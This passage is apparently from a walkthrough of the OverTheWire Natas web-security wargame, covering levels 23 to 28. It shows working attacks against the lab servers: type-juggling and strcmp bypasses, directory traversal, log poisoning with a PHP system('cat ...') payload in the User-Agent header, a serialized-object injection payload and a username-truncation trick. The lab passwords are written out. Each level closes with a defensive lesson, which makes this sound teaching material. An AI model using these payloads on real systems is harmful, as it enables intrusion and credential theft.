- `($_REQUEST["passwd"] > 10 )` compares the string to a number, causing PHP to implicitly convert it to an integer.

So we need to find a string that contains `iloveyou` and whose integer value is **greater than 10**.

This of course depends on how `PHP` evaluates the string as an integer.

Let's check `iloveyou`:
```powershell
php -r "var_dump((int)'iloveyou');"
```

Output:
```text
int(0)
```

Let's try a number greater than 10, like `11`:
```powershell
php -r "var_dump((int)'11');"
```

Output:
```text
int(11)
```

That works! But it does **not** contain `iloveyou`.

What about the combination?
```powershell
php -r "var_dump((int)'iloveyou11');"
```

Output:
```text
int(0)
```

We get the same result as for just `iloveyou`.

What about `11iloveyou`?
```powershell
php -r "var_dump((int)'11iloveyou');"
```

Output:
```text
int(11)
```

Bingo! That's it, we get `11` and `iloveyou` is included!

So `PHP` only parses numbers at the **start** of the string.

Now fill in `11iloveyou` in the form and submit it.

You'll get:
```html
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br>The credentials for the next level are:<br><pre>Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

And the password for natas24 is `MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd`.

#### The Lesson

Be careful when comparing strings to numbers in PHP — type juggling can break your logic.

### Level 24

- **Date**: 2026-04-20
- **URL**: `http://natas24.natas.labs.overthewire.org`
- **Password**: `MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

Notice the use of `strcmp()`. `strcmp()` expects **strings**.
If we pass an array to it, PHP raises a warning and the function returns `NULL`.
And `!NULL` evaluates to `true` in `PHP`!

So we can bypass the password check by passing an array instead of a string!

To pass an array in the `passwd` parameter, we can use `[]` in the query string:
```
http://natas24.natas.labs.overthewire.org/?passwd[]=1
```

This will cause `$_REQUEST["passwd"]` to be an array instead of a string.

When we submit this, we get the following warning and the credentials for natas25:
```html
<br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>
```

And the password for natas25 is `ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`.

#### The Lesson

Validate types and use `hash_equals()` for safe comparisons.

### Level 25

- **Date**: 2026-04-21
- **URL**: `http://natas25.natas.labs.overthewire.org`
- **Password**: `ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`
- **Tools**: Web Browser, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.<div align="right"><h6>Scientist, Bad Boy Bubby</h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):
```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en");
    }

    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) {
            include($filename);
            return 1;
        }
        return 0;
    }

    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;

        closedir($handle);
        return $listoffiles;
    }

    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n";
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php
    session_start();
    setLanguage();

    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
```

Notice the `safeinclude()` function that is used to include the language files.

`strstr($filename,"../")` checks if the filename contains `../` and removes it if it does.

But if we use `....//` instead of `../`, we can bypass this check and perform **directory traversal** anyway!

Let's try to read `/etc/passwd` which is always present on Linux systems (which Natas uses) and contains user information:
```powershell
curl.exe -i -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" "http://natas25.natas.labs.overthewire.org/?lang=....//etc/passwd"
```

No dice!

Try adding `....//` multiple times until we get the contents of `/etc/passwd`!
```powershell
curl.exe -i -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
"http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/passwd"
```

And it turns out that we need **5** `....//` to get to the **root directory** and read `/etc/passwd`!

Output:
```html
<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Notice `$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");` in `logRequest()`.
This means that the log file is named `natas25_<session_id>.log` and is stored in `/var/www/natas/natas25/logs/`.

So we also need the **session ID** to read the log file.

Perhaps we should use a **cookie jar** to store the session cookie so that we stay in the same session across all curl requests.

First run:
```powershell
curl.exe -i -c cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" "http://natas25.natas.labs.overthewire.org/"
```

Get the session ID from cookies.txt (or from the output of the curl request):
```text
PHPSESSID	5ighrbmvo9b5rhr1pjl9ve3qt5
```

Then try:
```powershell
curl.exe -s -b cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
"http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_5ighrbmvo9b5rhr1pjl9ve3qt5.log"
```

Output:
```html
<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

[21.04.2026 21::53:57] curl/8.18.0 "Directory traversal attempt! fixing request."
<br />
<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
<h2></h2><br />
<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
<p align="justify"><br />
<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
<div align="right"><h6></h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

That's the log file! We have successfully read the log file using directory traversal!

But we want to get the password from `/etc/natas_webpass/natas26` which is also on the server.

Notice `$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];` in `logRequest()`.
This means that the `User-Agent` header is logged in the log file.

We can use this to **poison** the log file by injecting PHP code into the `User-Agent` header, like `<?php system('cat /etc/natas_webpass/natas26'); ?>`.

Let's try this:
```powershell
curl.exe -b cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
-A "<?php system('cat /etc/natas_webpass/natas26'); ?>" `
"http://natas25.natas.labs.overthewire.org"
```

And read the log file again with:
```powershell
curl.exe -s -b cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
"http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_5ighrbmvo9b5rhr1pjl9ve3qt5.log"
```

Output:
```html
<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

[21.04.2026 21::53:57] curl/8.18.0 "Directory traversal attempt! fixing request."
[21.04.2026 21::57:48] curl/8.18.0 "Directory traversal attempt! fixing request."
<br />
<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
<h2></h2><br />
<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
<p align="justify"><br />
<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
<div align="right"><h6></h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

But the log file does not contain the output of our injected PHP code!

It took me hours to figure this out, until finally, with the help of Gemini, we did.

Notice that the previous command to **poison** the log file had **no** `lang` parameter!
```powershell
curl.exe -b cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
-A "<?php system('cat /etc/natas_webpass/natas26'); ?>" `
"http://natas25.natas.labs.overthewire.org"
```

Remember this part of the source code:
```php
function setLanguage(){
    /* language setup */
    if(array_key_exists("lang",$_REQUEST))
        if(safeinclude("language/" . $_REQUEST["lang"] ))
            return 1;
    safeinclude("language/en");
}

function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...

    if (file_exists($filename)) {
        include($filename);
        return 1;
    }
    return 0;
}
```

Look carefully.

What happens when `lang` is **not** present in the URL query parameters?

- `setLanguage()` is called.
- `array_key_exists("lang",$_REQUEST)` returns `false`.
- `safeinclude("language/" . $_REQUEST["lang"] )` is **not** executed.
- `safeinclude("language/en")` is called instead.
- `safeinclude()` checks whether the filename string `language/en` contains `../` or `natas_webpass`, which it does not.
- `logRequest()` is **not** called!

So we resend the request with a **dummy** `lang` parameter so safeinclude() uses user input.
```powershell
curl.exe -b cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
-A "<?php system('cat /etc/natas_webpass/natas26'); ?>" `
"http://natas25.natas.labs.overthewire.org/?lang=....//sample"
```

And read the log file again with:
```powershell
curl.exe -s -b cookies.txt -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" `
"http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_5ighrbmvo9b5rhr1pjl9ve3qt5.log"
```

Output:
```html
<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

[21.04.2026 22::11:20] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 "Directory traversal attempt! fixing request."
[21.04.2026 22::11:25] curl/8.18.0 "Directory traversal attempt! fixing request."
<br />
<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
<h2></h2><br />
<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
<p align="justify"><br />
<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
<div align="right"><h6></h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

And the password for natas26 is `cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`!

And at last we have the credentials for natas26!

#### The Lesson

Don’t rely on string filtering to secure file inclusion—it’s trivial to bypass.

## Levels 26 - 30

### Level 26

- **Date**: 2026-04-22
- **URL**: `http://natas26.natas.labs.overthewire.org`
- **Password**: `cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`
- **Tools**: Web Browser, `PHP`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):
```php
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```

Notice `$drawing=unserialize(base64_decode($_COOKIE["drawing"]));` in `drawFromUserdata()` and `storeData()`.
- `unserialize()` is used to convert a string representation of a PHP value back into a PHP value, like an array or an **object**.
- `$_COOKIE["drawing"]` is a **user-controlled** cookie value.
So we can **inject a PHP object** by controlling the serialized drawing cookie.

Notice the `Logger` class that is defined at the top of the source code.
When an object of the `Logger` class is destroyed, its `__destruct()` method is called.
And `__destruct()` **writes** `$exitMsg` to a **file** using `fwrite()`.

So we generate a serialized `Logger` object where we control its properties, so that `__destruct()` writes our payload into a file when the object is destroyed.

[level-26\logger_payload.php](level-26\logger_payload.php)
```php
<?php

class Logger
{
  private $logFile;
  private $initMsg;
  private $exitMsg;

  function __construct()
  {
    $this->logFile = "img/natas26_pass.php";
    $this->initMsg = "init";
    $this->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
  }
}

// Create the object and wrap it in an array
$o = new Logger();
$payload = array($o);

echo base64_encode(serialize($payload));
```

I chose `img/natas26_pass.php` as the file.

Run `php level-26/logger_payload.php` to get the payload:
```text
YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyMDoiaW1nL25hdGFzMjZfcGFzcy5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo0OiJpbml0IjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjI6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9fQ==
```

Open the browser's developer tools and set the `drawing` cookie to the payload value.

Then refresh the page to trigger the payload.

And go to `http://natas26.natas.labs.overthewire.org/img/natas26_pass.php` to see the password for natas27!
```txt
u3RRffXjysjgwFU6b9xa23i6prmUsYne
```

And the password for natas27 is `u3RRffXjysjgwFU6b9xa23i6prmUsYne`.

#### The Lesson

Don’t unserialize **untrusted** data — it allows object injection. Use safer formats like JSON instead.

### Level 27

- **Date**: 2026-04-22
- **URL**: `http://natas27.natas.labs.overthewire.org`
- **Password**: `u3RRffXjysjgwFU6b9xa23i6prmUsYne`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<h1>natas27</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):
```php
<?php

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>
```

Notice `$user=mysqli_real_escape_string($link, trim($usr));` in `dumpData()`.
- `trim($usr)` removes whitespace from the beginning and end of the username.
So "natas28             " becomes "natas28".

But `checkCredentials()` and `validUser()` only have `$user=mysqli_real_escape_string($link, $usr);`.
So these functions do **not** trim the username, which means that "natas28             " is treated as a different username than "natas28".

So we can create a **new user** with the username "natas28             " (with trailing spaces) and a password, and then log in with that **new** username and password to get the credentials for "natas28"!

**BUT** look at this in `createUser()`:
```php
if($usr != trim($usr)) {
    echo "Go away hacker";
    return False;
}
```

This means that we cannot create a user with trailing spaces in the username!
The admin anticipated this attack and put a check to prevent it!

Notice `$user=mysqli_real_escape_string($link, substr($usr, 0, 64));` in `createUser()`.
- `substr($usr, 0, 64)` truncates the username to 64 characters.
So "natas28[57 SPACES]a" becomes "natas28[57 SPACES]" **after** the check!

All we have to do is create a new user with username `natas28                                                         a` and password `123`.

And then just login with username `natas28                                                         ` (without the 'a') and password `123`.

And you get:
```html
<h1>natas27</h1>
<div id="content">
Welcome natas28                                                         !<br>Here is your data:<br>Array
(
    [username] =&gt; natas28
    [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
)
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

And the password for natas28 is `1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj`.

#### The Lesson

Do not implement **inconsistent handling of the same username** across functions (trim vs no trim vs substr truncation), as this leads to username **identity mismatch** in the database.

### SIDE NOTE FOR THE READER

Up until the previous level, I mostly used [ChatGPT](https://chat.openai.com/) to help me out when I was stuck, and for level 25, as mentioned, I had to go to [Gemini](https://gemini.google.com/). But for this level, both kept insisting that I should log in with `natas28` instead of the padded `natas28      ...` user we created. This obviously did not work, since the stored username actually includes the padding.

I then looked online and stumbled upon this great [Over the wire natas Walkthrough-Level-27 (Hacker4Help)](https://www.youtube.com/watch?v=NuYbU-drS48) video by **Hacker4Help**, which resolved the issue for me immediately. So I highly recommend this series.

From this point on, I will also refer to the **Hacker4Help series** when [ChatGPT](https://chat.openai.com/) and [Gemini](https://gemini.google.com/) fail again.

### Level 28

- **Date**: 2026-04-28
- **URL**: `http://natas28.natas.labs.overthewire.org`
- **Password**: `1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj`
- **Tools**: Web Browser, `curl`, `PHP`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<h1>natas28</h1>
<div id="content">

<form action="index.php" method="POST">
    <h2> Whack Computer Joke Database</h2>
    Search: <input name="query"><br>
    <input type="submit" value="search" />
</form>


<div id="viewsource">sorry, we are currently out of sauce</div>
</div>
```

`URL/index-source.html` returns a 404 Not Found error, which means that the source code is not available to us.

Let's try to put in a query and see what happens.

Put `joke` into the search field and click the search button!

Submitting the query redirects to:
```txt
http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIQgA1C82eT1228lUHOW3X2KSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
```

Notice that `query string`!

And the page shows:
```html
<h2> Whack Computer Joke Database</h2><ul><li>I've got a really good UDP joke to tell you, but I don't know if you'll get it</li></ul>
```

That is funny indeed! :D

Now let's see if we can do this again but with `curl.exe` in our terminal:
```powershell
curl.exe -L -u natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj -d "query=joke" "http://natas28.natas.labs.overthewire.org/index.php"
```
- `-L, --location` follows redirects. (which we need here for `search.php`)

And we do get:
```html
<h2> Whack Computer Joke Database</h2><ul><li>I've got a really good UDP joke to tell you, but I don't know if you'll get it</li></ul>
```
again!

Get the `query string` with `curl`:
```powershell
curl.exe -s -D - -o NUL -u natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj -d "query=joke" "http://natas28.natas.labs.overthewire.org/index.php"
```
- `-s, --silent` is silent mode
- `-D, --dump-header <filename>` writes the received headers to <filename> (in this case `-` which is stdout)
- `-o, --output <file>` writes to file instead of stdout (in this case `NUL` to discard the body)

Output:
```http
HTTP/1.1 302 Found
Date: Mon, 27 Apr 2026 20:07:11 GMT
Server: Apache/2.4.58 (Ubuntu)
Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIQgA1C82eT1228lUHOW3X2KSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
Content-Length: 920
Content-Type: text/html; charset=UTF-8
```

Let's make a `PHP` script that extracts the `query string` with `curl` for convenience.

[level-28/query.php](level-28/query.php):
```php
<?php

if (!isset($argv[1])) {
  echo "Usage: php query.php <input>\n";
  exit(1);
}

$input = $argv[1];

$output = shell_exec(
  'curl -s -L -D - -o /dev/null -u natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj ' .
    '-d "query=' . $input . '" ' .
    'http://natas28.natas.labs.overthewire.org/index.php'
);

preg_match('/Location:\s*.*query=([^\s]+)/i', $output, $m);

echo "$m[1]" . PHP_EOL;
```

`php level-28/query.php joke`:
```text
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIQgA1C82eT1228lUHOW3X2KSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
```

Notice that the `query` parameter is **URL-encoded Base64**.

Let’s write another `PHP` script that **decodes** the `query string` and displays the ciphertext in **16-byte blocks** encoded in `Base64`.

[level-28/decode.php](level-28/decode.php):
```php
<?php

$query = trim(file_get_contents("php://stdin"));
$cipher = base64_decode(urldecode($query));
$blocks = str_split($cipher, 16);

echo strlen($cipher) . " bytes: ";
foreach ($blocks as $b) {
  echo base64_encode($b) . "  ";
}
echo PHP_EOL;
```

First run `cd level-28` to navigate to the level-28 directory (for convenience).

`php query.php joke | php decode.php`:
```text
80 bytes: G+glEae6W/1XjA7vRm21nA==  3IRyj9z4nZN1HRCnx1yM8g==  EIANQvNnk9dtvJVBzlt19g==  KSh/PMVHnhLmbzHIY7GARw==  VtVzLcjHcPZDlxWLwXpuZg==
```

Let's try another search term (that produces jokes) like `computer`.

`php query.php computer`:
```text
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLOxD5BEouuJBr2svTs3MqTiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
```

`php query.php computer | php decode.php`:
```text
80 bytes: G+glEae6W/1XjA7vRm21nA==  3IRyj9z4nZN1HRCnx1yM8g==  zsQ+QRKLriQa9rL07NzKkw==  iW3pCIT4YQixZ/i0rqXXYw==  kXIyBRSD5o5Fj9BmFnswow==
```

The **first 2 ciphertext blocks** are identical for *"joke"* and *"computer"*, suggesting a **fixed prefix**.

Let's vary the input length to see how it affects ciphertext **block alignment**:
```powershell
1..20 | ForEach-Object { $a = "A" * $_; "$_ : $a : $(php query.php $a | php decode.php)" }
```

Output (important part):
```text
